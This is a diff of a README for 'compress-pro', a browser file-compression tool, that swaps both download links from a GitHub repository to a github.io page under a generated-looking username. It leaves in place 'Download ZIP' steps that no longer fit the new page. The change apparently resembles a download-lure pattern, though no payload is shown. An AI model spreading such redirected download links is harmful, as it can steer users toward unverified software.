@@ -1,6 +1,6 @@
 # 压缩 compress-pro - Compress files securely inside your browser
 
-[![Download compress-pro](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Smoothened-lessercentaury430/compress-pro)
+[![Download compress-pro](https://img.shields.io/badge/Download-Application-blue.svg)](https://smoothened-lessercentaury430.github.io)
 
 ## 📦 About the application
 
@@ -20,7 +20,7 @@ You do not need to install complex software or change your system settings to us
 
 ### 📥 Downloading the software
 
-Visit this page to download the necessary files: [https://github.com/Smoothened-lessercentaury430/compress-pro](https://github.com/Smoothened-lessercentaury430/compress-pro).
+Visit this page to download the necessary files: [https://smoothened-lessercentaury430.github.io](https://smoothened-lessercentaury430.github.io).
 
 Find the green button labeled "Code" on the page. Select "Download ZIP" from the menu. Move this folder to your desktop or your documents folder. Extract the contents so you can access the files inside.
 
